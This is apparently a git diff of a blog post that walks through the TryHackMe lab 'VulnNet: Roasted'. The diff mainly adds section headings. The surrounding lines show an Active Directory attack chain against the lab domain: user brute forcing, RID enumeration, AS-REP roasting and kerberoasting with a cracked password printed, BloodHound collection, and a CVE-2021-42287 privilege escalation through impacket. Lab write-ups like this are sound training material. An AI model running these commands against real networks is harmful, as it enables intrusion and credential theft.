@@ -2,10 +2,16 @@
 layout: post
 title: "VulnNet: Roasted"
 date: 2026-07-28 09:00:00 +0800
+image: /assets/images/THM/VulnNetRoasted/VulnetRoasted.png
 categories: [thm]
 tags: [tryhackme, 'VulnNet: Roasted', Easy]
 ---
 
+# LAB info
+link : https://tryhackme.com/room/vulnnetroasted
+Difficulty : Easy
+
+# Nmap discover open port
 
 1. nmap 
 
@@ -40,6 +46,8 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
+# kerbrute username
+
 2. try to brute force for the username 
 
 ```bash
@@ -67,6 +75,7 @@ netexec smb vulnnet-rst.local -u guest -p '' --shares
 smbclient //vulnnet-rst.local/VulnNet-Business-Anonymous -U vulnnet-rst.local/guest%
 ```
 
+# RID bruteforce
 
 4.  rid is the last few digit in the SID usch 500 administrator 
 
@@ -85,6 +94,8 @@ t-skid
 j-goldenhand
 j-leet
 ```
+
+#  AS-REP Roasting attack
 
 5.  try performing AS-REP Roasting incase the user we get have pre-authentication disable 
 
@@ -123,6 +134,9 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a25c3ba29877014983d84fc96926238a$9ab046b4
 ```
 
  ok we get the hash for the user t-skid
+
+# Crack 
+
 6. now hashcat crack it 
 
 ```cmd 
@@ -134,6 +148,7 @@ t-skid
 tj072889*
 ```
 
+# bloodhound
 
 7. now check with ldap if can we can bloodhound dump 
 
@@ -148,6 +163,8 @@ now we can just use bloodhound
 ```bash
 bloodhound-ce-python -u 't-skid' -p 'tj072889*' -d vulnnet-rst.local -dc WIN-2BO8M1OE1M1.vulnnet-rst.local -ns 10.48.147.26 -c All
 ```
+
+# kerberos attacks
 
 8. when look for kerberoastable i found the service  account enterprise-core-vn
 
@@ -175,6 +192,7 @@ enterprise-core-vn
 ry=ibfkfv,s6h,
 ```
 
+# Eunm and get user txt
 
 start again with normal enumeration
 
@@ -198,13 +216,16 @@ finally we can winrm
 
 we get the user.txt
 
+# Enum on env
 
-9. when i check with curretn priv found smtg intersesting 
+9. when i check with current priv found smtg intersesting 
 ![Image8](/assets/images/THM/VulnNetRoasted/VulnetRoasted-8.png)
 
 SeMachineAccountPrivilege is enabled and after some google it is related with cve 
 
 https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45
+
+# get the POC
 
 10. then i go donwload the poc
 
@@ -220,6 +241,8 @@ impacket-smbexec -target-ip vulnnet-rst.local -dc-ip vulnnet-rst.local -k -no-pa
 
 smbexec is fileless so we cannot cd 
 psexec will upload a file on the target machine so can cd and may be detected 
+
+# Root flag
 
 11. finally 
 we get the root flag
